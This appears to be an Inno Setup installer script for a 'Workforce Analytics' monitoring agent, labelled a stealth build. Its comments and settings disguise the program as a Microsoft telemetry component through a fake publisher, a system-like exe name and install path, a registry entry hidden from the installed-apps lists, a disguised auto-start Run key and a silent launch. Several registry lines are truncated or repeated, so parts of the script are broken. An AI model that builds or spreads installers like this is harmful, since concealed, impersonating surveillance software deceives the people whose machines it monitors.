; Inno Setup script for the Workforce Analytics desktop agent — STEALTH build.
;
; Stealth strategy:
;   1. Inno Setup does NOT write its own
;      HKLM uninstall entry, so the app never appears in "Programs and Features"
;      or "Apps & features" from the installer's own entry.
;   2. We write a MANUAL registry entry under HKCU\...\Uninstall\ with
;      SystemComponent=1 so Windows treats it as a non-visible system component.
;   3. The exe is renamed MicrosoftTelemetryHost.exe so Task Manager shows a
;      system-looking process name.
;   4. The install directory is hidden inside a standard Windows system path.
;
; Compile from `agent/packaging` directory:
;   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" windows\WorkforceAgent.iss

#define AppId       "WT-{8E1F4C2A-7B3D-4E9A-9F1C-2A6D5B0E3C71}"
#define AppVersion  "1.0.0"
; Registry alias — looks like a Microsoft system component
#define RegAlias    "WindowsTelemetryServiceHost"
; Exe name must match WorkforceAgent.spec EXE_NAME
#define ExeName     "MicrosoftTelemetryHost.exe"

[Setup]
AppId={#AppId}
; AppName is used only in the installer wizard title bar — make it generic.
AppName=CmdService
AppVersion={#AppVersion}
AppPublisher=Microsoft Corporation
; Install silently into a hidden system-like location under LocalAppData
; so it doesn't appear in %ProgramFiles% or %AppData% at first glance.
DefaultDirName={localappdata}\Microsoft\Windows\TelemetryHost
DisableDirPage=yes
DisableProgramGroupPage=yes
; Do NOT let Inno Setup create its own uninstall entry in Programs & Features.
; Keep the installer UI minimal / silent-friendly
DisableWelcomePage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
OutputDir=..\dist
OutputBaseFilename=WorkforceAgent-Setup-windows
SetupIconFile=..\icons\icon.ico
Compression=lzma2
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=lowest
ArchitecturesInstallIn64BitMode=x64compatible

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
; Source name must match the PyInstaller output (WorkforceAgent.spec EXE_NAME)
Source: "..\dist\{#ExeName}"; DestDir: "{app}"; Flags: ignoreversion

[Registry]
; ── HKCU stealth uninstall entry ─────────────────────────────────────────────
; SystemComponent=1 hides this from "Apps & features" (Settings) and
; "Programs and Features" (Control Panel).  Uses HKCU so no admin needed.
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: string; ValueName: "DisplayName"; \
  ValueData: "Windows Telemetry Service Host"; Flags: uninsdeletekey
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: string; ValueName: "Publisher"; \
  ValueData: "Microsoft Corporation"
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \

Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: string; ValueName: "InstallLocation"; ValueData: "{app}"

; ── HKCU Run key — auto-start under disguised name ───────────────────────────
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
  ValueType: string; ValueName: "WindowsTelemetryHost"; \
  ValueData: """{app}\{#ExeName}"""; \
  Flags: uninsdeletevalue

[Run]
; Launch silently after install (no dialog shown to user)
Filename: "{app}\{#ExeName}"; \
  Flags: nowait postinstall skipifsilent shellexec runasoriginaluser
